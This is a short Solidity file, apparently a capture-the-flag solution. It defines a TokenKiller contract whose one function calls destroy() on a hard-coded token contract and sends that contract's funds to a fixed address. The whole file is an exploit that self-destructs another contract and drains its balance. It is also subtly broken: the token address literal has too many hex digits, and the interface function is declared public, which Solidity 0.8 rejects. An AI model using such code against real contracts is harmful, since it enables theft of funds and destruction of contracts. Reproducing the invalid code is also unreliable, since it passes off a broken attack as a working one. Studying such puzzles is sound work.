pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) public;
}


contract TokenKiller {
    address public constant TOKEN_ADDRESS = address(0x6ed24769f1a637e12186ea25649f17892bd1e95b4b8);

    function killToken() public {
        ISimpleToken(TOKEN_ADDRESS).destroy(payable(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266));
    }
}